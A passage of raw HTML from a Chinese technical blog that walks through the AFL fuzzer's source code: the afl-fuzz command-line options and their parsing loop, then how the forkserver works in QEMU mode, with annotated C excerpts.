class="line">30</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz 2.52b by &lt;lcamtuf@google.com&gt;</span><br><span class="line"></span><br><span class="line">afl-fuzz [ options ] -- /path/to/fuzzed_app [ ... ]</span><br><span class="line"></span><br><span class="line">Required parameters:</span><br><span class="line"></span><br><span class="line">  -i dir        - input directory with test cases</span><br><span class="line">  -o dir        - output directory for fuzzer findings</span><br><span class="line"></span><br><span class="line">Execution control settings:</span><br><span class="line"></span><br><span class="line">  -f file       - location read by the fuzzed program (stdin)</span><br><span class="line">  -t msec       - timeout for each run (auto-scaled, 50-1000 ms)</span><br><span class="line">  -m megs       - memory limit for child process (50 MB)</span><br><span class="line">  -Q            - use binary-only instrumentation (QEMU mode)</span><br><span class="line">  -U            - use Unicorn-based instrumentation (Unicorn mode)</span><br><span class="line"></span><br><span class="line">Fuzzing behavior settings:</span><br><span class="line"></span><br><span class="line">  -d            - quick &amp; dirty mode (skips deterministic steps)</span><br><span class="line">  -n            - fuzz without instrumentation (dumb mode)</span><br><span class="line">  -x dir        - optional fuzzer dictionary (see README)</span><br><span class="line"></span><br><span class="line">Other stuff:</span><br><span class="line"></span><br><span class="line">  -T text       - text banner to show on the screen</span><br><span class="line">  -M / -S id    - distributed mode (see parallel_fuzzing.txt)</span><br><span class="line">  -C            - crash exploration mode (the peruvian rabbit thing)</span><br><span class="line"></span><br><span class="line">For additional tips, please consult /usr/local/share/doc/afl/README.</span><br></pre></td></tr></table></figure>

<p>必须的参数：</p>
<ul>
<li>-i：输入文件夹路径，里面有基本的测试样例</li>
<li>-o：afl 的输出文件夹路径</li>
</ul>
<p>额外控制选项：</p>
<ul>
<li>-f：被 fuzz 的程序从何处读取输入，默认是从 stdin 中读取</li>
<li>-t：每一轮模糊测试的超时时间</li>
<li>-m：fuzz fork 出来的子进程的内存限制</li>
<li>-Q：Qemu 模式启动，可以用来 fuzz 其他架构的程序</li>
<li>-u：unicorn 模式，没有怎么用过</li>
</ul>
<p>fuzz 行为设定：</p>
<ul>
<li>-d：quick &amp; dirty 模式，没有使用过</li>
<li>-n：dumb mode，同样没有使用过</li>
<li>-x dir：额外的 fuzzer 目录，没有使用过</li>
</ul>
<p>其他的设定：</p>
<ul>
<li>t：banner 的设定</li>
<li>-M：分布式相关的设定，或者说是并行 fuzz</li>
<li>-C：crash 探索模式</li>
</ul>
<p>这些命令参数的使用目前自己也还不大熟练，对于命令参数的解析在 afl-fuzz.c 的 main 函数中的第一个循环内，如下，可以看出参数的设定并不止帮助提示中的那些：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ((opt = getopt(argc, argv, <span class="string">&quot;+i:o:f:m:b:t:T:dnCB:S:M:x:QV&quot;</span>)) &gt; <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (opt) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;i&#x27;</span>: <span class="comment">/* input dir */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_dir) FATAL(<span class="string">&quot;Multiple -i options not supported&quot;</span>);</span><br><span class="line">        in_dir = optarg;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(in_dir, <span class="string">&quot;-&quot;</span>)) in_place_resume = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;o&#x27;</span>: <span class="comment">/* output dir */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (out_dir) FATAL(<span class="string">&quot;Multiple -o options not supported&quot;</span>);</span><br><span class="line">        out_dir = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* 这个地方不知道是用来做什么的 */</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: &#123; <span class="comment">/* master sync ID */</span></span><br><span class="line"></span><br><span class="line">          u8* c;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (sync_id) FATAL(<span class="string">&quot;Multiple -S or -M options not supported&quot;</span>);</span><br><span class="line">          sync_id = ck_strdup(optarg);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ((c = <span class="built_in">strchr</span>(sync_id, <span class="string">&#x27;:&#x27;</span>))) &#123;</span><br><span class="line"></span><br><span class="line">            *c = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">sscanf</span>(c + <span class="number">1</span>, <span class="string">&quot;%u/%u&quot;</span>, &amp;master_id, &amp;master_max) != <span class="number">2</span> ||</span><br><span class="line">                !master_id || !master_max || master_id &gt; master_max ||</span><br><span class="line">                master_max &gt; <span class="number">1000000</span>) FATAL(<span class="string">&quot;Bogus master ID passed to -M&quot;</span>);</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          force_deterministic = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>: </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sync_id) FATAL(<span class="string">&quot;Multiple -S or -M options not supported&quot;</span>);</span><br><span class="line">        sync_id = ck_strdup(optarg);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;f&#x27;</span>: <span class="comment">/* target file */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (out_file) FATAL(<span class="string">&quot;Multiple -f options not supported&quot;</span>);</span><br><span class="line">        out_file = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>: <span class="comment">/* dictionary */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (extras_dir) FATAL(<span class="string">&quot;Multiple -x options not supported&quot;</span>);</span><br><span class="line">        extras_dir = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>: &#123; <span class="comment">/* timeout */</span></span><br><span class="line"></span><br><span class="line">          u8 suffix = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (timeout_given) FATAL(<span class="string">&quot;Multiple -t options not supported&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">sscanf</span>(optarg, <span class="string">&quot;%u%c&quot;</span>, &amp;exec_tmout, &amp;suffix) &lt; <span class="number">1</span> ||</span><br><span class="line">              optarg[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) FATAL(<span class="string">&quot;Bad syntax used for -t&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (exec_tmout &lt; <span class="number">5</span>) FATAL(<span class="string">&quot;Dangerously low value of -t&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (suffix == <span class="string">&#x27;+&#x27;</span>) timeout_given = <span class="number">2</span>; <span class="keyword">else</span> timeout_given = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>: &#123; <span class="comment">/* mem limit */</span></span><br><span class="line"></span><br><span class="line">          u8 suffix = <span class="string">&#x27;M&#x27;</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (mem_limit_given) FATAL(<span class="string">&quot;Multiple -m options not supported&quot;</span>);</span><br><span class="line">          mem_limit_given = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(optarg, <span class="string">&quot;none&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            mem_limit = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">sscanf</span>(optarg, <span class="string">&quot;%llu%c&quot;</span>, &amp;mem_limit, &amp;suffix) &lt; <span class="number">1</span> ||</span><br><span class="line">              optarg[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) FATAL(<span class="string">&quot;Bad syntax used for -m&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">switch</span> (suffix) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;T&#x27;</span>: mem_limit *= <span class="number">1024</span> * <span class="number">1024</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;G&#x27;</span>: mem_limit *= <span class="number">1024</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;k&#x27;</span>: mem_limit /= <span class="number">1024</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:  FATAL(<span class="string">&quot;Unsupported suffix or bad syntax for -m&quot;</span>);</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (mem_limit &lt; <span class="number">5</span>) FATAL(<span class="string">&quot;Dangerously low value of -m&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="keyword">sizeof</span>(<span class="type">rlim_t</span>) == <span class="number">4</span> &amp;&amp; mem_limit &gt; <span class="number">2000</span>)</span><br><span class="line">            FATAL(<span class="string">&quot;Value of -m out of range on 32-bit systems&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>: &#123; <span class="comment">/* bind CPU core */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (cpu_to_bind_given) FATAL(<span class="string">&quot;Multiple -b options not supported&quot;</span>);</span><br><span class="line">          cpu_to_bind_given = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">sscanf</span>(optarg, <span class="string">&quot;%u&quot;</span>, &amp;cpu_to_bind) &lt; <span class="number">1</span> ||</span><br><span class="line">              optarg[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) FATAL(<span class="string">&quot;Bad syntax used for -b&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>: <span class="comment">/* skip deterministic */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (skip_deterministic) FATAL(<span class="string">&quot;Multiple -d options not supported&quot;</span>);</span><br><span class="line">        skip_deterministic = <span class="number">1</span>;</span><br><span class="line">        use_splicing = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>: <span class="comment">/* load bitmap */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* This is a secret undocumented option! It is useful if you find</span></span><br><span class="line"><span class="comment">           an interesting test case during a normal fuzzing process, and want</span></span><br><span class="line"><span class="comment">           to mutate it without rediscovering any of the test cases already</span></span><br><span class="line"><span class="comment">           found during an earlier run.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           To use this mode, you need to point -B to the fuzz_bitmap produced</span></span><br><span class="line"><span class="comment">           by an earlier run for the exact same binary... and that&#x27;s it.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           I only used this once or twice to get variants of a particular</span></span><br><span class="line"><span class="comment">           file, so I&#x27;m not making this an official setting. */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_bitmap) FATAL(<span class="string">&quot;Multiple -B options not supported&quot;</span>);</span><br><span class="line"></span><br><span class="line">        in_bitmap = optarg;</span><br><span class="line">        read_bitmap(in_bitmap);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>: <span class="comment">/* crash mode */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (crash_mode) FATAL(<span class="string">&quot;Multiple -C options not supported&quot;</span>);</span><br><span class="line">        crash_mode = FAULT_CRASH;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>: <span class="comment">/* dumb mode */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (dumb_mode) FATAL(<span class="string">&quot;Multiple -n options not supported&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (getenv(<span class="string">&quot;AFL_DUMB_FORKSRV&quot;</span>)) dumb_mode = <span class="number">2</span>; <span class="keyword">else</span> dumb_mode = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;T&#x27;</span>: <span class="comment">/* banner */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (use_banner) FATAL(<span class="string">&quot;Multiple -T options not supported&quot;</span>);</span><br><span class="line">        use_banner = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;Q&#x27;</span>: <span class="comment">/* QEMU mode */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (qemu_mode) FATAL(<span class="string">&quot;Multiple -Q options not supported&quot;</span>);</span><br><span class="line">        qemu_mode = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!mem_limit_given) mem_limit = MEM_LIMIT_QEMU;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;V&#x27;</span>: <span class="comment">/* Show version number */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Version number has been printed already, just quit. */</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line"></span><br><span class="line">        usage(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/13/afl%20qemu%20mode%E4%B8%AD%E5%85%B3%E4%BA%8Eforkserver%E7%9A%84%E4%BD%9C%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="OneShell">
      <meta itemprop="description" content="ToT">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="OneShell">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/04/13/afl%20qemu%20mode%E4%B8%AD%E5%85%B3%E4%BA%8Eforkserver%E7%9A%84%E4%BD%9C%E7%94%A8/" class="post-title-link" itemprop="url">afl qemu mode中关于forkserver的作用</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-04-13 09:53:28 / Modified: 09:55:20" itemprop="dateCreated datePublished" datetime="2023-04-13T09:53:28+08:00">2023-04-13</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/" itemprop="url" rel="index"><span itemprop="name">工具党</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/AFL/" itemprop="url" rel="index"><span itemprop="name">AFL</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="afl-qemu-mode-中关于-forkserver-作用"><a href="#afl-qemu-mode-中关于-forkserver-作用" class="headerlink" title="afl qemu-mode 中关于 forkserver 作用"></a>afl qemu-mode 中关于 forkserver 作用</h1><p>之前在看 afl 源码，粗略看了大概，没有对判断逻辑仔细查看。我原本理解的 afl 创建目标程序进程的方式为：afl-fuzz 父进程先通过 init_forkserver 创建一个 forkserver 子进程，然后对于每次新产生的变异数据，都在 forkserver 进程中通过 fork 创建子进程，通过之前 dup2 函数将变异数据传递到目标程序进程的标准输入，再 execv 加载目标程序，进行执行。</p>
<p>在 runtarget 函数中，只有当如下标志被设置了，才会使用上面描述的每次 fork 一个子进程，再 execve 这种每次需要额外花费进程生命周期（创建-&gt;执行-&gt;销毁）的方式：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (dumb_mode == <span class="number">1</span> || no_forkserver) </span><br></pre></td></tr></table></figure>

<p>afl 采用的 forkserver 技术，实际上是只进行一次 execve 函数执行，之后对于目标程序进程，是通过写时拷贝技术从已经停止的目标程序进程直接拷贝进程镜像，这样就节约了大量的性能。</p>
<p>最近在实现对于 cgi 的 fuzz，并且也还没有看过 afl-gcc 插桩的原理，此处就以 afl 的 qemu-mode 为例（似乎更加简介明了介绍 forkserver，源码编译的话，是汇编代码），简单介绍一下 afl 中 forkserver 的作用以及实现机制。</p>
<h2 id="afl-qemu-mode-中的-forkserver"><a href="#afl-qemu-mode-中的-forkserver" class="headerlink" title="afl qemu-mode 中的 forkserver"></a>afl qemu-mode 中的 forkserver</h2><p>首先简单说明一下 qemu 的基本执行流程，当 qemu 执行一个程序的时候，需要将 elf 进行加载，从被执行程序的入口点开始对基本块进行翻译。为了提升效率，qemu 会将翻译出来的基本块 TB 存放在 cache 中，当 qemu 执行一个基本块的时候首先判断基本块是否在 cache 中，如果在 cache 则命中直接执行基本块 TB，否则翻译再执行。</p>
<p>afl 的 qemu mode 在编译的时候对 qemu 的源码进行了修改 patch。首先在 elf 加载的时候在 elf 入口点、代码段的 start 和 end 三个地方修改，获得相关地址；然后在 cpu 执行也就是基本块翻译执行的地方进行了修改，也就是进行了与覆盖率统计和 forkserver 相关的插桩。详细的介绍可以看下我的这篇文章：<a href="https://oneshell.top/2022/01/03/afl%20qemu%E6%A8%A1%E5%BC%8F%E7%AE%80%E4%BB%8B/">afl qemu 模式简介</a></p>
<p>afl 的 qemu 模式，在每次执行一个基本块的时候，会调用宏定义 AFL_QEMU_CPU_SNIPPET2 来与 afl-fuzz 进程通信。这也就是在 qemu 实现对于目标程序插桩的原理。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> AFL_QEMU_CPU_SNIPPET2 do &#123; \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span>(itb-&gt;pc == afl_entry_point) &#123; \	</span></span><br><span class="line">      afl_setup(); \</span><br><span class="line">      afl_forkserver(cpu); \</span><br><span class="line">    &#125; \</span><br><span class="line">    afl_maybe_log(itb-&gt;pc); \</span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>如果当前执行的基本块是 afl_entry_point，也就是目标程序的入口点，就通过 afl_setup 函数初始化管道和共享内存，然后初始化 forkserver。然后通过 afl-maybe-log 往共享内存中设置覆盖率通信相关信息。此处主要是看一下 forkserver 是如何进行设置的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Fork server logic, invoked once we hit _start. */</span></span><br><span class="line"><span class="comment">// forkserver，会在程序的_start入口处激活一次</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">afl_forkserver</span><span class="params">(CPUState *cpu)</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">static</span> <span class="type">unsigned</span> <span class="type">char</span> tmp[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!afl_area_ptr) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Tell the parent that we&#x27;re alive. If the parent doesn&#x27;t want</span></span><br><span class="line"><span class="comment">     to talk, assume that we&#x27;re not running in forkserver mode. */</span></span><br><span class="line">  <span class="comment">// 通过状态管道向afl-fuzz主进程说明，forkserver已经启动</span></span><br><span class="line">  <span class="comment">// 如果写入失败，默认没有使用forkserver模式，return结束</span></span><br><span class="line">  <span class="keyword">if</span> (write(FORKSRV_FD + <span class="number">1</span>, tmp, <span class="number">4</span>) != <span class="number">4</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="comment">// 获取自身的进程号</span></span><br><span class="line">  afl_forksrv_pid = getpid();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* All right, let&#x27;s await orders... */</span></span><br><span class="line">  <span class="comment">// forkserver的主循环，也是在这个地方一直执行目标程序</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">pid_t</span> child_pid;</span><br><span class="line">    <span class="type">int</span> status, t_fd[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Whoops, parent dead? */</span></span><br><span class="line">    <span class="comment">// 从afl-fuzz进程的控制管道读取控制信息，如果读取失败，说明afl-fuzz主进程已经结束</span></span><br><span class="line">    <span class="keyword">if</span> (read(FORKSRV_FD, tmp, <span class="number">4</span>) != <span class="number">4</span>) <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Establish a channel with child to grab translation commands. We&#x27;ll</span></span><br><span class="line"><span class="comment">       read from t_fd[0], child will write to TSL_FD. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pipe(t_fd) || dup2(t_fd[<span class="number">1</span>], TSL_FD) &lt; <span class="number">0</span>) <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    close(t_fd[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    child_pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (child_pid &lt; <span class="number">0</span>) <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">    <span class="comment">// 进入子进程，</span></span><br><span class="line">    <span class="keyword">if</span> (!child_pid) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Child process. Close descriptors and run free. */</span></span><br><span class="line">	  <span class="comment">// 关闭无关的管道描述符</span></span><br><span class="line">      afl_fork_child = <span class="number">1</span>;</span><br><span class="line">      close(FORKSRV_FD);</span><br><span class="line">      close(FORKSRV_FD + <span class="number">1</span>);</span><br><span class="line">      close(t_fd[<span class="number">0</span>]);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span 